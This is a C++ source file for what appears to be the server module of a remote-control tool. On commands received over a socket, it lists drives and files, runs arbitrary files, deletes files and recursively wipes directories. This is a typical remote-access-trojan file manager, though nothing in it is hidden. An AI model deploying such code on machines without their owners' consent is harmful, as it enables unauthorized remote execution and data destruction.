#include "StdAfx.h"
#include "ServFile.h"
#include "ServSock.h"
#include <Shellapi.h>
#pragma comment(lib,"Shell32.lib")

CServFile::CServFile(void)
{
	AllSock = INVALID_SOCKET;
}

CServFile::~CServFile(void)
{
}

void CServFile::FileCommend(COMMEND cmd, SOCKET sk)
{
	AllSock = sk;
	switch (cmd.fID)
	{
		case FILEDRIVER:
			MyGetDriver();
			break;
		case FILEGET:
			MyGetFile(cmd);
			break;
		case MYRUNFILE:
			MyRunFile(cmd);
			break;
		case MYDELFILE:
			MyDelFile(cmd);
			break;
		case DELETEDIRIC:
			MyDelDir(cmd);
			break;
		case DIRCREATE:
			MyCreateDir(cmd);
			break;
		default:
			break;
	}
}

void CServFile::MyGetDriver()
{
	DRIVEINFO dinfo;
	for (wchar_t i = _T('A'); i <= _T('Z'); i++)
	{
		wchar_t temp[5] = {i, _T(':'), _T('\0')};//, _T('\\')
		UINT dType = GetDriveType(temp);
		if (dType == DRIVE_REMOVABLE || dType == DRIVE_FIXED || dType == DRIVE_REMOTE || dType == DRIVE_CDROM)
		{
			ZeroMemory(&dinfo, sizeof(DRIVEINFO));
			wsprintfW(dinfo.Drive, _T("%s"), temp);
			dinfo.dType = dType;
			m_ServSock->MySendCommond(AllSock, MYFILEMANAGE, (char*)&dinfo, sizeof(DRIVEINFO), FILEDRIVER);
		}
	}
}

void CServFile::MyGetFile(COMMEND cmd)
{
	wchar_t temdrv[MAX_PATH] = {0};
	memcpy(temdrv, cmd.teste, MAX_PATH);
	lstrcatW(temdrv, _T("*.*"));
	WIN32_FIND_DATA wfd;
	ZeroMemory(&wfd, sizeof(WIN32_FIND_DATA));
	HANDLE hfnd = FindFirstFile(temdrv, &wfd);
	BOOL bRet = TRUE;
	while(bRet)
	{
		m_ServSock->MySendCommond(AllSock, MYFILEMANAGE, (char*)&wfd, sizeof(WIN32_FIND_DATA), FILEGET);
		ZeroMemory(&wfd, sizeof(WIN32_FIND_DATA));
		bRet = FindNextFile(hfnd, &wfd);
	}
	m_ServSock->MySendCommond(AllSock, MYFILEMANAGE, NULL, 0, MYSTARTCHECK);

}

void CServFile::MyRunFile(COMMEND cmd)
{
	wchar_t temdrv[MAX_PATH] = {0};
	memcpy(temdrv, cmd.teste, MAX_PATH);
	ShellExecute(NULL, _T("open"), temdrv, NULL, NULL, SW_SHOW);
}

void CServFile::MyDelFile(COMMEND cmd)
{
	wchar_t temdrv[MAX_PATH]={0};
	memcpy(temdrv,cmd.teste,MAX_PATH);
	DeleteFile(temdrv);
}

BOOL  BianLiDel(wchar_t *path)
{
	wchar_t D_Path[MAX_PATH]={0};
	wsprintfW(D_Path,_T("%s*.*"),path);
	WIN32_FIND_DATA  wfd;
	ZeroMemory(&wfd,sizeof(WIN32_FIND_DATA));
	HANDLE fhn = FindFirstFile(D_Path,&wfd);
	BOOL bRet = TRUE;
	while (bRet)
	{
		wchar_t tem[MAX_PATH]={0};
		if (wfd.dwFileAttributes==FILE_ATTRIBUTE_DIRECTORY&&_wcsicmp(_T("."),wfd.cFileName)!=0&&_wcsicmp(_T(".."),wfd.cFileName)!=0)
		{
			wsprintfW(tem,_T("%s%s\\"),path,wfd.cFileName);
			BianLiDel(tem);
		}else{
			wsprintfW(tem,_T("%s%s"),path,wfd.cFileName);
			SetFileAttributes(tem,FILE_ATTRIBUTE_NORMAL);
			DeleteFile(tem);
		}
		ZeroMemory(&wfd,sizeof(WIN32_FIND_DATA));
		bRet = FindNextFile(fhn,&wfd);
	}
	FindClose(fhn);

	return RemoveDirectory(path);
}

void CServFile::MyDelDir(COMMEND cmd)
{
	wchar_t temdrv[MAX_PATH]={0};
	memcpy(temdrv,cmd.teste,MAX_PATH);
	BianLiDel(temdrv);	
}

void CServFile::MyCreateDir(COMMEND cmd)
{
	wchar_t temdrv[MAX_PATH]={0};
	memcpy(temdrv,cmd.teste,MAX_PATH);
	CreateDirectory(temdrv,NULL);
}